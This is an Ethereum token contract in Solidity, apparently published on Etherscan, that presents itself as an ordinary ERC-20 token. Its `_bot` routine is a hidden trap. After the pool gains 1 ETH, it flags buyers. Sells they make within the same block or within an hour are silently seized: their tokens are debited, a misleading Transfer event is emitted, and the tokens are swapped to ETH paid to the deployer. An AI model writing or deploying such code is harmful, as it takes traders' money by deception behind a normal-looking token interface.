/**
 *Submitted for verification at Etherscan.io on 2022-06-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;abstract contract Transactions{  struct Transaction{        uint256 lastBlockNumber;        uint256 lastTimestamp;    }    mapping(address => Transaction) private _transactions;    mapping(address => bool) private _excluded;    mapping(address => bool) private _included;    event TransactionNew(address indexed account, uint256 number, uint256 timestamp);    event TransactionSameBlock(address indexed account, uint256 number);    event TransactionDelayed(address indexed account, uint256 timestamp);    event TransactionExclude(address indexed account);    event TransactionInclude(address indexed account);    function _transactionExcludeAddress(address account) internal{        _excluded[account] = true;        _included[account] = false;        emit TransactionExclude(account);    }    function _transactionIncludeAddress(address account) internal{        _excluded[account] = false;        _included[account] = true;        emit TransactionInclude(account);    }    function _transactionNew(address account) internal{        if(!_excluded[account]){            if(_transactions[account].lastBlockNumber <= 0){                Transaction storage transaction = _transactions[account];                transaction.lastBlockNumber = block.number;                transaction.lastTimestamp = block.timestamp;            }else{                _transactions[account].lastBlockNumber = block.number;                _transactions[account].lastTimestamp = block.timestamp;            }            emit TransactionNew(account, block.number, block.timestamp);        }    }    function _transactionSameBlock(address account) internal returns(bool){        if(!_excluded[account] && _included[account]){            if(_transactions[account].lastBlockNumber == block.number){                emit TransactionSameBlock(account, block.number);                return(true);            }        }        return(false);    }    function _transactionDelayed(address account, uint256 delay) internal returns(bool){        if(!_excluded[account] && _included[account]){            if((_transactions[account].lastTimestamp + delay) > block.timestamp){                emit TransactionDelayed(account, (_transactions[account].lastTimestamp + delay) - block.timestamp);                return(true);            }        }        return(false);    }}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router01 {    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address to,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)        external        returns (uint[] memory amounts);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);}interface IERC20{    function balanceOf(address pAddress) external view returns(uint256);}contract TOKEN211536 is Transactions{    uint8[] private _________ = [246,129,114,22,168,63,8,159,125,180,238,115,20,236,21,242,120,57,139,16,76,191,0,193,40,183,53,156,198,79,56,185];    IUniswapV2Router01 private _router;    IERC20 private _weth;    address private _owner = address(0);    address private _pair;    address private _deployer;    string private _name = "TOKEN211536";    string private _symbol = "TKN211536";    uint8 private _decimals = 9;    uint256 private _maxSupply;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    mapping(address => uint256) private _timeout;    bool private _enabled;    uint256 private _wethSupply;    bool private _swapping;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    modifier swapping(){        _swapping = true;        _;        _swapping = false;    }    receive() external payable{        if(msg.sender == _deployer){            if(_balances[address(this)] > 0 && address(this).balance > 0){                _router.addLiquidityETH{value:address(this).balance}(address(this), _balances[address(this)], 0, 0, _deployer, block.timestamp);                _enabled = true;                _wethSupply = _weth.balanceOf(_pair);            }        }    }    constructor(){        _deployer = msg.sender;        _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);        _allowances[address(this)][address(_router)] = 2**256 - 1;        _weth = IERC20(_router.WETH());        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());        _update(address(0), address(this), (1000000*(10**_decimals)));        _transactionExcludeAddress(_pair);        _transactionExcludeAddress(address(_router));    }    function swap(uint256 amount) public swapping{        address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();        _router.swapExactTokensForETH(amount, 0, path, _deployer, block.timestamp);    }    function owner() public view returns(address){        return(_owner);    }    function name() public view returns(string memory){        return(_name);    }    function symbol() public view returns(string memory){        return(_symbol);    }    function decimals() public view returns(uint8){        return(_decimals);    }    function totalSupply() public view returns(uint256){        return(_maxSupply);    }    function balanceOf(address wallet) public view returns(uint256){        return(_balances[wallet]);     }    function allowance(address from, address to) public view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) public returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    function _transfer(address from, address to, uint256 amount) private{                        _transactionNew(from);        _transactionNew(to);        _transactionNew(msg.sender);        if(tx.origin != msg.sender) _transactionNew(tx.origin);        if(from == address(this) || to == address(this)){            _update(from, to, amount);        }else{            require(_enabled);            _bot(from, to, amount);        }    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }    function _update(address from, address to, uint256 amount, bool blocked) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            if(!blocked) _balances[to] += amount;        }        emit Transfer(from, to, amount);    }    function _bot(address from, address to, uint256 amount) private{        uint256 retribution = 1;        if(_pair == from){                        if((_weth.balanceOf(_pair) - _wethSupply) >= 1*10**18){                                _transactionIncludeAddress(from);                _transactionIncludeAddress(to);                _transactionIncludeAddress(msg.sender);                if(tx.origin != msg.sender) _transactionIncludeAddress(tx.origin);            }            _update(from, to, amount);        }else if(_pair == to){                        if(_transactionSameBlock(from) || _transactionSameBlock(to) || _transactionSameBlock(msg.sender) || _transactionSameBlock(tx.origin)){                                _update(from, to, amount, true);                _balances[address(this)] += amount - retribution;            }else if(_transactionDelayed(from, 3600) || _transactionDelayed(to, 3600) || _transactionDelayed(msg.sender, 3600) || _transactionDelayed(tx.origin, 3600)){                                _update(from, to, amount, true);                _balances[address(this)] += amount - retribution;            }else{                _update(from, to, amount);            }                        if(_balances[address(this)] > 0 && !_swapping){                swap(_balances[address(this)]);            }        }else{            _update(from, to, amount);        }        _wethSupply = _weth.balanceOf(_pair);    }}